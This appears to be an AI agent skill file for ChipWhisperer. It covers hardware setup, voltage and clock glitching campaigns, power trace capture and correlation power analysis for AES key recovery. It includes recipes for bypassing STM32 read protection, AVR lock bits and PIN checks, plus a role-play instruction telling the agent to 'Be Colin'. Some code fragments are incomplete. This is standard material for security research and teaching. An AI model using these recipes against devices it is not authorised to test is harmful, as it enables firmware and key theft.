---
name: chipwhisperer
description: ChipWhisperer and ChipWhisperer-Lite setup, voltage glitching, clock glitching, power trace capture, and correlation power analysis (CPA). The recommended tool for hardware fault injection and side-channel attacks.
---

# ChipWhisperer Skill

ChipWhisperer is Colin O'Flynn's open-source platform for fault injection and side-channel analysis — the standard tool in the field. The CW-Lite (most common) is covered here; patterns generalise to CW-Pro and CW-Husky. You are Colin O'Flynn's apprentice now — read the documentation, understand the hardware, and experiment with the settings. Do not guess. Do not brute-force blindly. Understand the underlying physics and timing to find the sweet spot. Be Colin. Become the master of glitching. Question everything. Prove yourself with data. Only then will you succeed.

```
pip install chipwhisperer
```

Documentation: https://chipwhisperer.readthedocs.io
Original research: Colin O'Flynn — https://colinoflynn.com
Course material: ChipWhisperer Jupyter notebooks (included with install)

---

## Hardware variants

| Board | Glitch | Power Analysis | Clock | Notes |
|-------|--------|---------------|-------|-------|
| **CW-Lite (CWLITE)** | Voltage + Clock | Yes | Yes | Best value, most documented |
| **CW-Lite ARM** | Voltage + Clock | Yes | Yes | CW-Lite + STM32F3 target board |
| **CW-Pro** | Voltage + Clock + EMFI | Yes | Yes | Standalone, larger sample buffer |
| **CW-Husky** | Voltage + Clock + EMFI | Yes | Yes | Latest, highest sample rate |
| **CW-Nano** | Voltage only | Yes | No | Entry level, 20MHz ADC |

For most embedded targets: **CW-Lite is sufficient**.

---

## Device setup

```python
import chipwhisperer as cw

# Connect to CW (auto-detects CW-Lite, Pro, Husky)
scope = cw.scope()
print(scope)  # Shows connected hardware and firmware version

# Firmware upgrade if needed
scope.upgrade_firmware()

# Default setup: 7.37 MHz clock, reasonable ADC settings
scope.default_setup()

# Connect to target board (SimpleSerial protocol over UART)
target = cw.target(scope, cw.targets.SimpleSerial)

# For SimpleSerial v2 (newer targets)
target = cw.target(scope, cw.targets.SimpleSerial2)

# For a bare target (no SimpleSerial, just UART)
target = cw.target(scope, cw.targets.UART)
```

---

## IO pin mapping (CW-Lite)

```python
# CW-Lite connector pinout:
# TIO1 → target RX  (CW transmits)
# TIO2 → target TX  (CW receives)
# TIO3 → trigger input OR general IO
# TIO4 → trigger input (most common)
# GLITCH → crowbar output for voltage glitch
# CLKOUT → clock output to target (for clock glitching)
# nRST → target reset

# Set IO roles explicitly:
scope.io.tio1 = "serial_tx"   # CW TIO1 → target RX
scope.io.tio2 = "serial_rx"   # CW TIO2 ← target TX
scope.io.tio4 = "high_z"      # TIO4 as trigger input (floating = passive)
scope.io.clkout = "clkgen"    # Drive target clock from CW
scope.io.nrst = "gpio_low"    # Hold target in reset (active low)
scope.io.nrst = "gpio_high"   # Release reset

# Trigger on TIO4 going high:
scope.trigger.triggers = "tio4"
```

---

## Clock configuration

```python
# Generate 7.37 MHz (common for AVR/ARM targets)
scope.clock.clkgen_freq = 7.37e6
scope.io.clkout = "clkgen"

# For faster targets (Cortex-M at 24 MHz)
scope.clock.clkgen_freq = 24e6

# ADC clock (must be set for power capture)
scope.clock.adc_src = "clkgen_x4"   # ADC at 4x target clock (default)
scope.clock.adc_src = "clkgen_x1"   # ADC at 1x (slower targets)

# Check clock lock status
print(scope.clock.pll_locked)  # Should be True
```

---

## Voltage glitching (crowbar)

Voltage glitching briefly shorts VCC to GND via the GLITCH output MOSFET. The target briefly gets zero volts, causing a fault.

### Hardware wiring for voltage glitch

```
Target VCC ────────────────── Target SoC VCC pin
                 │
           10Ω resistor          ← shunt for current measurement
                 │
           CW GLITCH pin         ← CW crowbar connects here
```

The shunt between CW GLITCH and the SoC VCC pin means CW can both measure power (via the shunt voltage) and inject the crowbar.

### Python: voltage glitch campaign

```python
import chipwhisperer as cw
import chipwhisperer.common.results.glitch as glitch_results
import time
import json

scope = cw.scope()
scope.default_setup()
target = cw.target(scope, cw.targets.SimpleSerial)

# Voltage glitch mode: crowbar via GLITCH pin
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"   # Crowbar only (no clock modification)
scope.glitch.trigger_src = "ext_single"  # Single shot on external trigger

# Initial parameters (adjust for target)
scope.glitch.ext_offset = 500    # Clock cycles from trigger to glitch
scope.glitch.width = 49.8        # Crowbar duty cycle (% of clock period)
scope.glitch.repeat = 1          # Number of consecutive glitch pulses

def reset_target():
    scope.io.nrst = "gpio_low"
    time.sleep(0.1)
    scope.io.nrst = "gpio_high"
    time.sleep(0.5)

def attempt_glitch(ext_offset: int, width: float) -> str:
    """
    Attempt a single voltage glitch.
    Returns: 'success', 'reset', 'normal', or 'interesting'
    """
    scope.glitch.ext_offset = ext_offset
    scope.glitch.width = width

    reset_target()
    scope.arm()

    # Trigger is provided by target activity on TIO4 or UART TX
    # Wait for capture
    ret = scope.capture()

    if ret:  # Timeout
        return "timeout"

    # Read target response
    response = target.read(timeout=100)

    if not response:
        return "reset"

    # Classify
    if any(s in response for s in ['success', 'unlocked', 'bypass', '#', 'root']):
        return "success"
    elif "error" in response.lower() or "fault" in response.lower():
        return "interesting"
    elif len(response) > 5:
        return "normal"
    else:
        return "reset"


# Use CW's GlitchController for parameter sweep
gc = cw.GlitchController(
    groups=["success", "reset", "normal", "interesting"],
    parameters=["width", "ext_offset"]
)

# Set sweep ranges
gc.set_range("width", 0, 49.8)
gc.set_range("ext_offset", 0, 5000)
gc.set_global_step(1)

# Randomised search (better than grid for initial exploration)
import random
results_log = []

for _ in range(2000):
    ext_offset = random.randint(0, 5000)
    width = random.uniform(0, 49.8)

    result = attempt_glitch(ext_offset, width)
    entry = {"ext_offset": ext_offset, "width": width, "result": result}
    results_log.append(entry)
    gc.add(result, [width, ext_offset])

    print(f"  [{_:4d}] offset={ext_offset:5d} width={width:5.1f}% → {result}")

    if result == "success":
        print(f"\n[!!!] SUCCESS: ext_offset={ext_offset} width={width}")

# Save results
with open(".out/hardware/glitch-campaign.json", "w") as f:
    json.dump(results_log, f, indent=2)

# Plot results (if in Jupyter)
# gc.plot_2d(plotdots={"success": "+g", "reset": "xr", "normal": ".b", "interesting": "*y"})
```

---

## Clock glitching

Clock glitching inserts or removes a clock edge, causing the CPU to execute at a point where register values are not yet stable (setup/hold violation).

```python
# Clock XOR mode: insert a brief extra clock pulse
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "clock_xor"    # XOR a glitch pulse into the clock
scope.glitch.trigger_src = "ext_single"

# Width in clock_xor mode: percentage of clock period
# Positive: glitch adds extra half-cycle (clock goes high briefly)
# Negative: glitch removes part of a clock edge
scope.glitch.width = 10.0     # 10% of clock period
scope.glitch.ext_offset = 1000  # cycles before glitch

# For clock_xor, effective glitch range is approximately:
# CW-Lite: -49.9% to +49.9% (hardware limit)
# Sweet spot for most targets: 5% to 20%

# glitch_only mode: replace the clock entirely with a glitch pulse
scope.glitch.output = "glitch_only"

# Typical clock glitch campaign for STM32 RDP bypass:
for ext_offset in range(500, 3000, 1):
    for width in [5.0, 7.5, 10.0, 12.5, 15.0]:
        scope.glitch.ext_offset = ext_offset
        scope.glitch.width = width
        result = attempt_glitch(ext_offset, width)
        if result == "success":
            print(f"[!!!] BYPASS at offset={ext_offset} width={width}%")
```

---

## Power trace capture

CW captures power consumption over time via a shunt resistor between target VCC and the SoC.

```python
# ADC setup
scope.adc.samples = 5000      # Samples per trace
scope.adc.offset = 0          # Start capture at trigger
scope.adc.basic_mode = "rising_edge"  # Trigger on rising edge

# Capture a single trace
scope.arm()
target.simpleserial_write('p', b'\x00' * 16)  # Send plaintext
ret = scope.capture()

if not ret:
    trace = scope.get_last_trace()
    print(f"Trace shape: {len(trace)} samples")
    # trace is a numpy array of float values

# Capture N traces with known plaintexts (for SCA)
import numpy as np

N = 1000
traces = np.zeros((N, scope.adc.samples))
plaintexts = [np.random.randint(0, 256, 16, dtype=np.uint8) for _ in range(N)]
key = np.array([0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
                0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c], dtype=np.uint8)

for i in range(N):
    scope.arm()
    target.simpleserial_write('k', key)        # Set key
    target.simpleserial_write('p', plaintexts[i])  # Send plaintext
    ret = scope.capture()
    if not ret:
        traces[i] = scope.get_last_trace()
    print(f"\rCapturing: {i+1}/{N}", end="")

print(f"\n[+] Captured {N} traces, shape: {traces.shape}")
np.save("traces.npy", traces)
```

---

## Correlation Power Analysis (CPA)

CPA recovers secret keys by correlating power traces with a leakage model (Hamming weight of intermediate values).

```python
import numpy as np
import chipwhisperer.analyzer as cwa
from chipwhisperer.analyzer.attacks.cpa import CPA
from chipwhisperer.analyzer.attacks.models.aes128_modes import SBox_output

# Load traces and plaintexts
traces = np.load("traces.npy")
plaintexts = np.load("plaintexts.npy")  # shape (N, 16)

# CPA on AES first round, all 16 key bytes
attack = CPA()
attack.set_model(SBox_output)
attack.set_reporting_interval(10)

# Run attack
results = attack.run_attack(traces, plaintexts, progress=True)

# Extract recovered key
print("\nRecovered key:")
recovered_key = []
for byte_num in range(16):
    best_guess = results.best_guess()[byte_num]
    correlation = results.max_pge()[byte_num]
    print(f"  Byte {byte_num:2d}: 0x{best_guess:02x}  (correlation: {correlation:.4f})")
    recovered_key.append(best_guess)

print(f"\nKey: {' '.join(f'{b:02x}' for b in recovered_key)}")
```

### Manual CPA (no chipwhisperer.analyzer dependency)

```python
import numpy as np

def hamming_weight(x: int) -> int:
    return bin(x).count('1')

# AES S-Box
SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    # ... (full 256-entry S-Box)
]

def cpa_aes_byte(traces: np.ndarray, plaintexts: np.ndarray,
                  byte_idx: int) -> tuple[int, float]:
    """
    CPA on a single AES key byte.
    Returns (best_key_guess, max_correlation).
    """
    n_traces, n_samples = traces.shape
    best_key = 0
    best_corr = 0.0

    for key_guess in range(256):
        # Compute hypothetical power consumption (Hamming weight of S-Box output)
        hw = np.array([
            hamming_weight(SBOX[plaintexts[i, byte_idx] ^ key_guess])
            for i in range(n_traces)
        ], dtype=float)

        # Pearson correlation between hw and each sample point
        hw_norm = hw - hw.mean()
        hw_std = hw.std()

        if hw_std == 0:
            continue

        # Vectorised correlation across all sample points
        t_norm = traces - traces.mean(axis=0)
        t_std = traces.std(axis=0)
        t_std[t_std == 0] = 1  # avoid div by zero

        corr = (hw_norm @ t_norm) / (n_traces * hw_std * t_std)
        max_corr = np.abs(corr).max()

        if max_corr > best_corr:
            best_corr = max_corr
            best_key = key_guess

    return best_key, best_corr
```

---

## TVLA (Test Vector Leakage Assessment)

Before running full CPA, confirm that the target leaks information with Welch's t-test:

```python
import numpy as np
from scipy import stats

def tvla_test(traces_fixed: np.ndarray, traces_random: np.ndarray,
               threshold: float = 4.5) -> dict:
    """
    Welch t-test between fixed and random input traces.
    |t| > 4.5 indicates leakage (standard threshold).
    """
    t_stats, _ = stats.ttest_ind(traces_fixed, traces_random,
                                   axis=0, equal_var=False)

    leaky_samples = np.where(np.abs(t_stats) > threshold)[0]

    return {
        "max_t": float(np.abs(t_stats).max()),
        "leaky_sample_count": len(leaky_samples),
        "leaks": len(leaky_samples) > 0,
        "leaky_samples": leaky_samples.tolist()[:20],  # First 20 leaky points
    }

# Usage:
# Capture N traces with fixed plaintext
# Capture N traces with random plaintext
result = tvla_test(traces_fixed, traces_random)
if result["leaks"]:
    print(f"[+] Target leaks! Max |t| = {result['max_t']:.2f} at "
          f"{result['leaky_sample_count']} samples → proceed with CPA")
else:
    print(f"[-] No leakage detected (max |t| = {result['max_t']:.2f})")
```

---

## Common attack recipes

### STM32F1/F2/F4 UART bootloader glitch (unlock RDP Level 1)

```python
# STM32 UART bootloader is accessible when BOOT0 = high
# Send GetID command (0x00 XOR 0xFF = 0x00, 0xFF)
# Glitch the RDP check

scope.clock.clkgen_freq = 38.4e6  # STM32 bootloader often runs at this frequency
scope.glitch.output = "clock_xor"
scope.glitch.clk_src = "clkgen"
scope.glitch.trigger_src = "ext_single"

# Bootloader command trigger: TIO4 goes high when STM32 transmits ACK
scope.trigger.triggers = "tio4"

# Known working range for some STM32F1 parts (varies by silicon revision):
# ext_offset: 800 - 1200
# width: 6.0 - 14.0%
for ext_offset in range(700, 1500, 2):
    for width in [6.0, 8.0, 10.0, 12.0]:
        # ... attempt and classify
```

### AVR ATmega lock bit bypass

```python
scope.clock.clkgen_freq = 7.37e6  # Standard AVR clock
scope.glitch.output = "clock_xor"

# AVR fuse read via SPI programming interface
# Glitch during the comparison of lock bits
# ext_offset range: 200 - 800 cycles typically
```

### Password comparison bypass (generic)

```python
# Target: device asks for PIN on UART, compare in ROM
# Strategy: glitch the compare instruction

# 1. Find the timing window: send correct PIN, measure trace
# 2. Find the timing window: send wrong PIN, compare traces
# 3. The divergence point is where the comparison happens → glitch there

scope.glitch.output = "enable_only"   # Voltage glitch: more reliable for ARM
scope.glitch.clk_src = "clkgen"

# Send wrong PIN, trigger on UART TX (target transmitting 'Enter PIN:')
scope.trigger.triggers = "tio4"
target.write("000000\r\n".encode())

# Adjust ext_offset to hit the comparison
for ext_offset in range(100, 10000, 10):
    scope.glitch.ext_offset = ext_offset
    # check response
```

---

## Connecting an arbitrary target (no target board)

When using CW-Lite without a dedicated target board:

```python
# Wire CW-Lite header to target:
# CW TIO1 (3.3V GPIO) → target RX
# CW TIO2 (3.3V GPIO) ← target TX
# CW CLKOUT → target clock input (remove crystal first for clock glitch)
# CW GLITCH → between VCC rail and target (10Ω shunt)
# CW GND → target GND
# CW 3.3V → target VCC (if target draws < 200mA)
# CW nRST → target RESET pin

# Check CW can power the target:
print(scope.io.target_pwr)  # True = CW is powering target
scope.io.target_pwr = True  # Enable 3.3V supply from CW
```

---

## Saving and loading a project

```python
import chipwhisperer as cw

# Save project (traces + config)
project = cw.create_project("aes-attack-2024", overwrite=True)
project.traces.append(
    cw.Trace(trace_data, plaintext, ciphertext, key)
)
project.save()

# Load project
project = cw.open_project("aes-attack-2024")
traces = np.array([t.wave for t in project.traces])
plaintexts = np.array([t.textin for t in project.traces])
```

---

## Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| `cw.scope()` fails | CW not found / USB | Check USB, install udev rules |
| `pll_locked` is False | Bad clock settings | Run `scope.default_setup()` again |
| All results are "reset" | Width too wide | Start at width=1%, widen slowly |
| All results are "normal" | Window missed | Widen ext_offset range significantly |
| Target bricked | Anti-tamper triggered | Check target datasheet for permanent lock bits |
| Traces are noisy | Bad shunt contact | Check GLITCH wire, reduce clock frequency |
| CPA correlation < 0.5 | Too few traces or leakage model wrong | Increase N, check key schedule model |

---

## Integration with fault-injection skill

ChipWhisperer is the **recommended tool** for fault injection. The fault-injection skill covers general methodology; this skill covers CW-specific implementation. Use them together:

1. Load `fault-injection` skill → characterise the target, identify glitch window
2. Load `chipwhisperer` skill → implement the campaign with CW-Lite
3. On success → hand off to `firmware-extraction` or `jtag-exploitation`
